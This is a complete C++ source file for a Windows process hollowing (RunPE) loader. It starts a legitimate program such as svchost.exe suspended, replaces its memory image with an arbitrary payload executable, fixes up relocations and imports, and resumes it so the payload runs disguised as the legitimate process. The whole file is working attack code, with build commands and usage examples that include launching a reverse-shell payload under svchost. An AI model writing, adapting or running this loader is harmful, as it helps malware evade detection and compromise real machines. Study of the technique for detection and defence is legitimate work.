/*
 * Process Hollowing (RunPE)
 *
 * Plain English:
 *   Spawn a legit program (default: svchost.exe) suspended, unmap its
 *   code image from memory, map YOUR payload PE into that same address
 *   space, patch up relocations and imports, point the primary thread
 *   at your payload's entry point, then resume. Task Manager shows the
 *   process as whatever legit program you spawned, but it is actually
 *   running your code.
 *
 * What makes it different from the others:
 *   The payload is a COMPLETE PE file (not shellcode), and it runs
 *   under a legit process name/image path. Highest visual stealth,
 *   also the most complex to implement (hand-rolled PE loader).
 *
 * MITRE ATT&CK: T1055.012 - Process Hollowing
 *
 * Chain:
 *   CreateProcessA(host, CREATE_SUSPENDED)
 *   -> read PEB.ImageBaseAddress of host
 *   -> NtUnmapViewOfSection host image
 *   -> VirtualAllocEx at payload ImageBase (or any address)
 *   -> WriteProcessMemory(headers + each section)
 *   -> apply base relocations if we didn't land at preferred base
 *   -> resolve payload's import table (walk each DLL, GetProcAddress each
 *      function, write to IAT)
 *   -> patch PEB.ImageBaseAddress to new base
 *   -> SetThreadContext RIP = new_base + AddressOfEntryPoint
 *   -> ResumeThread
 *
 * Compile:
 *   x86_64-w64-mingw32-g++ -std=c++20 -o hollow.exe process_hollowing.cpp
 *   cl /std:c++20 process_hollowing.cpp /Fe:hollow.exe
 *
 * Usage:
 *   hollow.exe <payload.exe> [host_process]
 *   hollow.exe calc.exe
 *   hollow.exe revshell.exe svchost.exe
 *
 * Payload must be an x64 PE. For 32-bit payloads use a 32-bit host and
 * swap all the x64 context code for Ebx/Eax.
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>

typedef NTSTATUS (NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);


/* Apply base relocations to the mapped image in our local staging buffer.
 * delta = (actual base allocated in target) - (payload's preferred ImageBase).
 */
static void apply_relocations(BYTE* image, IMAGE_NT_HEADERS* nh, ULONGLONG delta) {
    if (delta == 0) return;

    IMAGE_DATA_DIRECTORY* dir = &nh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (dir->Size == 0) return;

    IMAGE_BASE_RELOCATION* r = (IMAGE_BASE_RELOCATION*)(image + dir->VirtualAddress);
    while (r->VirtualAddress) {
        DWORD count = (r->SizeOfBlock - sizeof(*r)) / sizeof(WORD);
        WORD* entries = (WORD*)(r + 1);
        for (DWORD k = 0; k < count; ++k) {
            WORD type   = entries[k] >> 12;
            WORD offset = entries[k] & 0xFFF;
            if (type == IMAGE_REL_BASED_DIR64) {
                *(ULONGLONG*)(image + r->VirtualAddress + offset) += delta;
            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                *(DWORD*)(image + r->VirtualAddress + offset) += (DWORD)delta;
            }
        }
        r = (IMAGE_BASE_RELOCATION*)((BYTE*)r + r->SizeOfBlock);
    }
}


/* Resolve the payload's import table. We call LoadLibraryA/GetProcAddress
 * on OUR side because kernel32 lives at the same base in every process
 * on the same OS boot - the resolved addresses are valid in the target. */
static void resolve_imports(BYTE* image, IMAGE_NT_HEADERS* nh) {
    IMAGE_DATA_DIRECTORY* dir = &nh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (dir->Size == 0) return;

    IMAGE_IMPORT_DESCRIPTOR* iid = (IMAGE_IMPORT_DESCRIPTOR*)(image + dir->VirtualAddress);
    while (iid->Name) {
        const char* dllName = (const char*)(image + iid->Name);
        HMODULE mod = LoadLibraryA(dllName);
        if (!mod) { iid++; continue; }

        IMAGE_THUNK_DATA* oit = (IMAGE_THUNK_DATA*)(image + iid->OriginalFirstThunk);
        IMAGE_THUNK_DATA* it  = (IMAGE_THUNK_DATA*)(image + iid->FirstThunk);

        while (oit->u1.AddressOfData) {
            FARPROC addr;
            if (oit->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                addr = GetProcAddress(mod, (LPCSTR)(oit->u1.Ordinal & 0xFFFF));
            } else {
                IMAGE_IMPORT_BY_NAME* name = (IMAGE_IMPORT_BY_NAME*)(image + oit->u1.AddressOfData);
                addr = GetProcAddress(mod, name->Name);
            }
            it->u1.Function = (ULONGLONG)addr;
            oit++; it++;
        }
        iid++;
    }
}


int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Process Hollowing PoC\n");
        printf("Usage: %s <payload.exe> [host.exe]\n", argv[0]);
        printf("  %s calc.exe\n", argv[0]);
        printf("  %s revshell.exe svchost.exe\n", argv[0]);
        return 1;
    }

    const char* payloadPath = argv[1];
    const char* hostName    = argc > 2 ? argv[2] : "svchost.exe";

    char hostPath[MAX_PATH];
    if (strchr(hostName, '\\')) {
        strncpy_s(hostPath, MAX_PATH, hostName, _TRUNCATE);
    } else {
        snprintf(hostPath, MAX_PATH, "C:\\Windows\\System32\\%s", hostName);
    }

    printf("[*] Host    : %s\n", hostPath);
    printf("[*] Payload : %s\n", payloadPath);

    /* --- read payload into a local buffer --- */
    HANDLE hFile = CreateFileA(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile(payload) failed (%lu)\n", GetLastError());
        return 1;
    }
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* file = (BYTE*)VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD read = 0;
    ReadFile(hFile, file, fileSize, &read, NULL);
    CloseHandle(hFile);

    IMAGE_DOS_HEADER* dh = (IMAGE_DOS_HEADER*)file;
    if (dh->e_magic != IMAGE_DOS_SIGNATURE) { printf("[-] Bad DOS header\n"); return 1; }
    IMAGE_NT_HEADERS* nh = (IMAGE_NT_HEADERS*)(file + dh->e_lfanew);
    if (nh->Signature != IMAGE_NT_SIGNATURE) { printf("[-] Bad NT header\n"); return 1; }

    DWORD imgSize   = nh->OptionalHeader.SizeOfImage;
    ULONGLONG prefBase = nh->OptionalHeader.ImageBase;
    printf("[+] SizeOfImage=%lu, preferred base=0x%llx\n", imgSize, prefBase);

    /* --- stage mapped image in a local buffer first --- */
    BYTE* local = (BYTE*)VirtualAlloc(NULL, imgSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memset(local, 0, imgSize);
    memcpy(local, file, nh->OptionalHeader.SizeOfHeaders);

    IMAGE_NT_HEADERS* nhLocal = (IMAGE_NT_HEADERS*)(local + dh->e_lfanew);
    IMAGE_SECTION_HEADER* sh = IMAGE_FIRST_SECTION(nhLocal);
    for (int i = 0; i < nhLocal->FileHeader.NumberOfSections; ++i) {
        if (sh[i].SizeOfRawData) {
            memcpy(local + sh[i].VirtualAddress,
                   file  + sh[i].PointerToRawData,
                   sh[i].SizeOfRawData);
        }
    }

    /* --- spawn host suspended --- */
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(hostPath, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess(%s) failed (%lu)\n", hostPath, GetLastError());
        return 1;
    }
    printf("[+] Spawned suspended: PID %lu, TID %lu\n", pi.dwProcessId, pi.dwThreadId);

    /* --- read host's PEB.ImageBaseAddress (x64) --- */
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(pi.hThread, &ctx);
    ULONGLONG hostImageBase = 0;
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
                      &hostImageBase, sizeof(hostImageBase), NULL);
    printf("[+] Host image base: 0x%llx\n", hostImageBase);

    /* --- unmap host image --- */
    pNtUnmapViewOfSection NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    NtUnmapViewOfSection(pi.hProcess, (PVOID)hostImageBase);
    printf("[+] Unmapped host image\n");

    /* --- try to allocate at payload's preferred base, fall back to any --- */
    PVOID remote = VirtualAllocEx(pi.hProcess, (PVOID)prefBase,
        imgSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) {
        remote = VirtualAllocEx(pi.hProcess, NULL,
            imgSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    if (!remote) {
        printf("[-] VirtualAllocEx failed (%lu)\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    ULONGLONG delta = (ULONGLONG)remote - prefBase;
    printf("[+] Allocated %lu bytes @ %p (delta=0x%llx)\n", imgSize, remote, delta);

    /* --- fix relocations in local staging buffer (easier than reaching
         into target repeatedly), then fix imports --- */
    apply_relocations(local, nhLocal, delta);
    printf("[+] Base relocations applied\n");
    resolve_imports(local, nhLocal);
    printf("[+] Imports resolved\n");

    /* --- blast the fixed-up image into the target --- */
    SIZE_T written = 0;
    WriteProcessMemory(pi.hProcess, remote, local, imgSize, &written);
    printf("[+] Wrote %zu bytes to target\n", written);

    /* --- patch PEB.ImageBaseAddress to new base --- */
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
                       &remote, sizeof(remote), NULL);

    /* --- point RCX at new entry point (RtlUserThreadStart reads RCX as
         the thread entry on x64) --- */
    ctx.Rcx = (ULONGLONG)remote + nhLocal->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);
    printf("[+] RIP target: %p + AddressOfEntryPoint = 0x%llx\n",
           remote, (ULONGLONG)ctx.Rcx);

    /* --- go --- */
    ResumeThread(pi.hThread);
    printf("[+] Hollowed. Payload now running as %s PID %lu.\n",
           hostName, pi.dwProcessId);

    VirtualFree(local, 0, MEM_RELEASE);
    VirtualFree(file,  0, MEM_RELEASE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
